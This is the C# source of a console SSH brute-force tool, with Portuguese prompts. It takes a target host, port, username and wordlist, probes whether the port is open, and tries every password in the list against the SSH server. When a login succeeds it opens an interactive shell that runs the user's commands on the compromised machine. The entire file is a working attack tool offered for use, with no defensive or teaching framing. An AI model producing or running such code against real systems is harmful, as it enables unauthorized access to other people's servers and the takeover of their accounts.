using System;
using System.IO;
using Renci.SshNet;
using System.Net.Sockets;
using SshNet;

namespace Brute_SSH
{
    class Program
    {
        public static bool bol1 = false;
        public static string[] senhas = new string[6];
        public static void banner()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@" ______   _______  _______  _______  _          _______  _______          ");
            Console.WriteLine(@"(  ___ \ (  ____ )(  ____ \(  ___  )| \    /\  (  ____ \(  ____ \|\     /|");
            Console.WriteLine(@"| (   ) )| (    )|| (    \/| (   ) ||  \  / /  | (    \/| (    \/| )   ( |");
            Console.WriteLine(@"| (__/ / | (____)|| (__    | (___) ||  (_/ /   | (_____ | (_____ | (___) |");
            Console.WriteLine(@"|  __ (  |     __)|  __)   |  ___  ||   _ (    (_____  )(_____  )|  ___  |");
            Console.WriteLine(@"| (  \ \ | (\ (   | (      | (   ) ||  ( \ \         ) |      ) || (   ) |");
            Console.WriteLine(@"| )___) )| ) \ \__| (____/\| )   ( ||  /  \ \  /\____) |/\____) || )   ( |");
            Console.WriteLine(@"|/ \___/ |/   \__/(_______/|/     \||_/    \/  \_______)\_______)|/     \|");
            Console.WriteLine("\n                                                 A simble Brute-Force SSH");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"          Github: https://github.com/diego-tella/BruteSSH");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"--------------------------------------------------------------------------");
        }

        static void Main(string[] args)
        {
            //Variáveis
            string ip, pass, user, word, port;
            int porta;
            bool bol2 = false;

            banner();
            Console.ForegroundColor = ConsoleColor.Green; //cor verde de REQUER XD
            volt2:
            Console.WriteLine("Digite o Host");
            ip = Console.ReadLine();
            if(ip == "")
            {
                Console.WriteLine("IP Invalido.");
                goto volt2;
            }

            Console.WriteLine("Digite a porta (enter para 22)");
            port = Console.ReadLine();

            volt1:
            Console.WriteLine("Digite o usuário");
            user = Console.ReadLine();
            if (user == "")
            {
                Console.WriteLine("Usuário Invalido. Coloque novamente!");
                goto volt1;
            }
            Console.WriteLine("Qual a wordlist? (enter para padrão) ");
            word = Console.ReadLine();

            //Verificações
            if (word == "")
                word = "wordlist.txt";
            if (port == "")
                porta = 22;
            else
                porta = Convert.ToInt32(port);

            //Host ativo?
            try
            {
                TcpClient sh = new TcpClient();
                sh.Connect(ip, porta);
            }
            catch(Exception ex)
            {
                if (ex.ToString().Contains("10061"))
                {
                    Console.WriteLine("A porta " + porta + " do IP " + ip + " está fechada.");
                    Environment.Exit(0);
                }
                else if (ex.ToString().Contains("11001"))
                {
                    Console.WriteLine("O alvo "+ip+" não existe. Cancelando ataque...");
                    Environment.Exit(0);
                }
                else if (ex.ToString().Contains("10060"))
                {
                    Console.WriteLine("o servidor SSH do IP " + ip + " está com um firewall dropando conexões.");
                    Console.WriteLine("Deseja tentar mesmo assim? [y/n]");
                    string resp = Console.ReadLine();
                    if (resp == "n")
                        Environment.Exit(0);
                }
            }

            int ae = -1;
            try
            {
                StreamReader str = new StreamReader(word);
                while ((pass = str.ReadLine()) != null)
                {

                    try
                    {
                        using (var client = new SshClient(ip, porta, user, pass))
                        {
                            client.Connect();
                            client.Disconnect();
                            ae++;
                            senhas[ae] = pass;
                            Console.WriteLine("[+] Senha Encontrada - " + pass + "\nDigite 1 para continuar com o ataque\nDigite 2 para abrir uma shell");
                            string resp = Console.ReadLine();
                            if (resp == "2")
                            {
                                Console.WriteLine("Abrindo shell...");
                                client.Connect();
                                while (true)
                                {
                                    if (!bol2)
                                        Console.WriteLine("Shell aberta. Digite exit para sair.");
                                    else
                                        Console.WriteLine("$");
                                    bol2 = true;
                                    var comand = Console.ReadLine();
                                    var output = client.RunCommand(comand);
                                    if (comand.ToString() == "exit")
                                        break;
                                    else
                                        Console.WriteLine(output.Result);
                                }
                                client.Disconnect();
                                break;
                            }
                            else if (resp == "1")
                            {
                                Console.WriteLine("Continuando ataque...");
                            }

                        }
                    }
                    catch (Exception ex)
                    {
                        if (ex.ToString().Contains("Permission denied"))
                            Console.WriteLine("[+] Senha errada - " + pass);
                        else if (ex.ToString().Contains("10051"))
                        {
                            Console.WriteLine("Não foi possível conectar ao alvo.");
                            bol1 = true;
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Erro Desconhecido: " + ex.ToString());
                            bol1 = true;
                            break;
                        }
                    }

                }
            }
            catch
            {
                Console.WriteLine("O arquivo não existe.");
                Environment.Exit(0);
            }

            Console.WriteLine("\nFim do ataque.");
            if (!bol1)
            {
                Console.WriteLine("Senha encontradas para o usuário "+user+":");
                bool found = false;
                foreach (var item in senhas)
                {
                    if (item != null)
                    {
                        Console.WriteLine("[+] "+item);
                        found = true;
                    }
                    if (!found)
                    {
                        Console.WriteLine("Nenhuma senha foi encontrada.");
                        break;
                    }
                }
            }

        }
    }

}

